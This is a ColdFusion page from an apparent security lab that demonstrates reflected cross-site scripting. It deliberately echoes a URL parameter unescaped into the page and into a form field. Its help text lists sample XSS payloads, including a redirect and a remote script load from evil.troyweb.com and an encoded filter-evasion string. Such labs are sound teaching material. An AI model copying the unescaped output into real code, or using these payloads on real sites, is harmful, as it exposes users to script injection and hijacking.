<!DOCTYPE html>
<html class="no-js"><!-- InstanceBegin template="/Templates/main.dwt.cfm" codeOutsideHTMLIsLocked="false" -->
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	<!-- InstanceBeginEditable name="doctitle" -->
<title>&lt;cfmlabs&gt;</title>
<!-- InstanceEndEditable -->
	<meta name="description" content="">
	<meta name="viewport" content="width=device-width">
	<link rel="stylesheet" href="../../css/bootstrap.min.css">
	<link rel="stylesheet" href="../../css/bootstrap-responsive.min.css">
	<link rel="stylesheet" href="../../css/main.css">
	<script src="../../js/vendor/modernizr-2.6.2-respond-1.1.0.min.js"></script>
	<!-- InstanceBeginEditable name="head" -->
<!-- InstanceEndEditable -->
	<!-- InstanceParam name="description" type="text" value="" -->
</head>
<body>
	<cfinclude template="../../lib/includes/header.cfm" />

	<div class="container-fluid">
		<!-- InstanceBeginEditable name="content" -->
	<cfparam name="url.msg" default="" />
	<div class="row-fluid">
		<cfif len(trim(url.msg))>
			<div class="alert">
				<button type="button" class="close" data-dismiss="alert">&times;</button>
				<strong>You said:</strong> <cfoutput>#url.msg#</cfoutput>
			</div>
		</cfif>
		<div class="span12">
			<form action="<cfoutput>#cgi.script_name#</cfoutput>" method="get">
				<fieldset>
					<legend>Classic xss hack(s)</legend>
					<label>post your message</label>
					<input type="text" name="msg" placeholder="Type something" value="<cfoutput>#url.msg#</cfoutput>" class="input-xxlarge">
					<span class="help-block">
						we're gonna just blindly spit this out with cfoutput. What nasty things could you enter here?
						<ul>
							<li>&lt;script&gt;alert('dude');&lt;/script&gt;</li>
							<li>&lt;script&gt;window.location.replace('http://evil.troyweb.com');&lt;/script&gt;</li>
							<li>&lt;script src='http://evil.troyweb.com/exploit.js'&gt;&lt;/script&gt;</li>
							<li>';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))</li>
							<li>%45%3C%73%63%72%69%70%74%3E%77%69%6E%64%6F%77%2E%6C%6F%63%61%74%69%6F%6E%2E%72%65%70%6C%61%63%65%28%27%68%74%74%70%3A%2F%2F%65%76%69%6C%2E%74%72%6F%79%77%65%62%2E%63%6F%6D%27%29%3B%3C%2F%73%63%72%69%70%74%3E%6E%74%65%72%20%79%6F%75%72%20%58%53%53%20%68%65%72%65</li>
						</ul>
						
					</span>
					<button type="submit" class="btn">Submit</button>
				</fieldset>
			</form>
		</div>
	</div>
	<!-- InstanceEndEditable -->
		<hr>
	</div>

	<cfinclude template="../../lib/includes/footer.cfm" />

	<script src="../../js/vendor/jquery-1.10.1.min.js"></script>
	<script src="../../js/vendor/bootstrap.min.js"></script>
	<script src="../../js/main.js"></script>
	<!-- InstanceBeginEditable name="js" -->
	<!-- InstanceEndEditable -->
</body>
<!-- InstanceEnd --></html>
